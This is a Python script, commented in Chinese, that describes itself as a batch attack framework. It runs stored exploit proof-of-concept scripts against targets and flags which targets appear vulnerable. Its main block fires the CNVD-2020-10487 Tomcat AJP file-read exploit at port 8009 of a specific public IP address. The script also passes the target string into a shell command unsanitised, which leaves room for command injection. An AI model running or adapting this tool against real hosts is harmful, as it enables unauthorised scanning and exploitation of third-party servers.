#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os,time,datetime,subprocess,shlex
'''
#此为批量攻击框架,只要按照相关参数配置,并把相关poc放到相关的文件夹下面便可进行批量探测
target   :[必须指定] 该字段要进行攻击的目标参数,这个需要根据源poc中的要求来填写。比如原poc中要求输入的参数是为127.0.0.1那么您就不能填写https://127.0.0.1 
flag     :[非必须]   该数组主要是根据poc执行之后的结果中是否含有某个字段来判断原POC执行是否成功以判断待测试站点是否存在漏洞
poc_add  :[必须指定] 该数组存储poc的相对路径信息比如poc的相对路径信息为../../find/vulnerability/cve-2020-0708,则poc_add存储的信息为["vulnerability","cve-2020-0708","cve-2020-0708"]信息
command  :[必须指定] 该字段主要存储原poc执行的命令比如原poc需要执行的命令为 python2 cve-2020-0708.py  -p 8009  -f WEB-INF/web.xml,待测试的目标不需要填写,因为工具会根据exploit参数传入的参数自动加上去
vulnerability:[非必须]该字段是字符串,主要是漏洞的名字比如 "cve-2019-01-02"
time_out :[非必须]该参数主要是控制poc执行的时间,超过一定时间如果还没有响应则可以认为测试站点不存在漏洞,默认时间是3s
该函数返回的结果是以字典的形式进行返回{"target":target,"isVuln":"Yes","vuln":vuln,"response":response}
'''
def exploit(target='',flag='',poc_add='',command='',vulnerability="Vulnerability",time_out=2):
    time_out    = int(time_out)
    msg         = "[{timer}] : 开始探测 {target} 是否存在{vulnerability}漏洞".format(timer = time.strftime("%Y-%m-%d %X",time.localtime()),target=target,vulnerability=vulnerability)
    print(msg)
    path        =   os.getcwd()                                                                                         # 获取当前执行的绝对路径信息,注意因为该文件需要被find.py调用,所以获取的绝对路径信息时find.py所在文件夹的绝对路径信息
    file_path   =   os.path.join(path,poc_add[0],poc_add[1],poc_add[2])
    command     =   command.replace(poc_add[2],file_path)                                                               # 将poc的绝对路径带入执行
    command     =   command + " " + str(target)                                                                         # 根据传入的参数形成POC执行的完整路径
    completed = subprocess.Popen(
        command,
        shell  = True,
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        )
    try:
        standard_output, standard_error = completed.communicate(timeout=time_out)                                       #请求超时时间,默认超过2s认为目标不存在漏洞
        if ifExistInString(flag, standard_output) == False:                                                             #自定义响应内容,比如响应内容出现了time_out或者not或者404等内容,程序判断目标不存在某漏洞
            if ifExistInString(flag, standard_error) == False:
                res = {"target": target, "isVuln": "Yes", "vuln": vulnerability, "response": str(standard_output, encoding = "utf-8").replace('\n', '').replace('\r', '')[0:60]}
                return res
            else:
                res = {"target": target, "isVuln": "No", "vuln": vulnerability, "response":str(standard_error, encoding = "utf-8").replace('\n', '').replace('\r', '')[0:60]}
                return res
        else:
            res = {"target": target, "isVuln": "No", "vuln": vulnerability, "response": str(standard_error, encoding = "utf-8").replace('\n', '').replace('\r', '')[0:60]}
            return res
    except  Exception as e:
        print(e)
        completed.kill()
        standard_output, standard_error = completed.communicate()
        res = {"target": target, "isVuln": "No", "vuln": vulnerability, "response": "Time out "}
        #print(standard_error)
        return res

#flag是数组,存放着标识,如果flag里面有一个字符串存在字符串Str中则函数返回True,flag里面的标识全部都不存在字符串Str中则返回False
def ifExistInString(flag,s):
    count      = 0
    #print(type(s))
    if "bytes" in str(type(s)):
        s = str(s, encoding="utf-8")     # 如果是bytes类型则将其转化为String类型
    elif "list" in str(type(s)):
        s = str(s)
    for f in flag:
        if str(f) not in s:
            count = count + 1
    #print(count)
    if count == len(flag):
        return False
    else:
        return True


if __name__=='__main__':
    print(time.strftime("%Y-%m-%d %X", time.localtime()))
    res = exploit(target="123.206.106.206",flag=["Operation timed out","most recent call last",'NotImplementedError'],poc_add=["","CNVD-2020-10487","CNVD-2020-10487.py"],command="python2 CNVD-2020-10487.py  -p 8009  -f WEB-INF/web.xml ",vulnerability="CNVD-2020-10487",time_out="2")
    print(res)
    print(time.strftime("%Y-%m-%d %X", time.localtime()))
# print(res["isVuln"])
# print(res["response"])

#
# res = ifExistInString([1254,121212122],[b'124', '456'])
# print(res)





